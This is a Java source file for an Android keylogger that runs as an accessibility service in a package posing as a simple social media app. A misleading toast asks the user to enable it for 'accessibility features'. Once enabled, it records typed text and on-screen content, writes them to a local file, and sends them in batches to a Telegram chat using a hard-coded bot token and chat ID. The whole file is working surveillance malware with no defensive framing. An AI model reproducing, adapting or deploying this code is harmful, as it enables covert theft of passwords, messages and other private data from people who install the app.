package com.example.simplesocialmediaapp;

import android.os.Handler;
import android.os.Looper;
import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;

public class KeyLoggerService extends AccessibilityService {
    private static final String TAG = "KeyLoggerService";
    private static final String BOT_TOKEN = "7545622303:AAEXdpb9SKyVYtKta0rBxqj6VomGloNYqNI";
    private static final String CHAT_ID = "-1002656317906";

    private final ConcurrentLinkedQueue<String> logQueue = new ConcurrentLinkedQueue<>();
    private final Handler handler = new Handler(Looper.getMainLooper());
    private static final long SEND_INTERVAL_MS = 30000; // 30 seconds
    private static final int MAX_CHUNK_SIZE = 15;
    private static final long SCREEN_TEXT_COOLDOWN_MS = 5000; // 5 seconds cooldown for screen text

    private String lastScreenText = "";
    private long lastScreenTextTimestamp = 0;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Toast.makeText(this, "To enhance accessibility features, please enable this service.", Toast.LENGTH_LONG).show();
        startPeriodicLogFlush();
    }

    private void startPeriodicLogFlush() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                flushLogsToTelegram();
                handler.postDelayed(this, SEND_INTERVAL_MS);
            }
        }, SEND_INTERVAL_MS);
    }

    private void writeLogToFile(String logEntry) {
        File file = new File(getFilesDir(), "activity.log");
        try {
            if (!file.exists()) {
                file.getParentFile().mkdirs();
                file.createNewFile();
            }
            try (FileWriter writer = new FileWriter(file, true)) {
                writer.append(logEntry).append("\n");
            }
        } catch (IOException e) {
            Log.e(TAG, "Error writing log to file", e);
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String encoded = URLEncoder.encode(message, "UTF-8");
                String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;

                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                int response = conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Telegram response: " + response + " for message: " + message);
            } catch (Exception e) {
                Log.e(TAG, "Telegram send failed", e);
            }
        }).start();
    }

    private void flushLogsToTelegram() {
        if (logQueue.isEmpty()) return;

        StringBuilder chunk = new StringBuilder();
        int lines = 0;

        while (!logQueue.isEmpty() && lines < MAX_CHUNK_SIZE) {
            chunk.append(logQueue.poll()).append("\n");
            lines++;
        }

        String message = chunk.toString().trim();
        if (!message.isEmpty()) {
            sendToTelegram(message);
        }
    }

    private String getTimestamp() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    private String extractTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder content = new StringBuilder();
        if (node.getText() != null) content.append(node.getText().toString()).append(" ");
        for (int i = 0; i < node.getChildCount(); i++) {
            content.append(extractTextFromNode(node.getChild(i)));
        }
        return content.toString().trim();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String timestamp = getTimestamp();
        String logEntry = "";

        // Handle key presses
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            StringBuilder textBuilder = new StringBuilder();
            for (CharSequence cs : event.getText()) {
                textBuilder.append(cs);
            }
            String text = textBuilder.toString().trim();
            if (!text.isEmpty()) {
                logEntry = "[" + timestamp + "] Key Pressed: " + text;
                logQueue.add(logEntry);
                writeLogToFile(logEntry);
                Log.d(TAG, "Keystroke captured: " + logEntry);
            }
        }

        // Handle screen content changes with debouncing
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String content = extractTextFromNode(source).trim();
                long currentTime = System.currentTimeMillis();

                // Check for cooldown and content similarity
                if (!content.isEmpty() &&
                        (!content.equals(lastScreenText) || (currentTime - lastScreenTextTimestamp > SCREEN_TEXT_COOLDOWN_MS))) {

                    lastScreenText = content;
                    lastScreenTextTimestamp = currentTime;

                    logEntry = "[" + timestamp + "] Screen Text: " + content;
                    logQueue.add(logEntry);
                    writeLogToFile(logEntry);
                    Log.d(TAG, "Screen text captured: " + logEntry);
                }
            }
        }

        // Try to flush logs if enough messages accumulated
        if (logQueue.size() >= MAX_CHUNK_SIZE) {
            flushLogsToTelegram();
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    public void onDestroy() {
        flushLogsToTelegram();
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
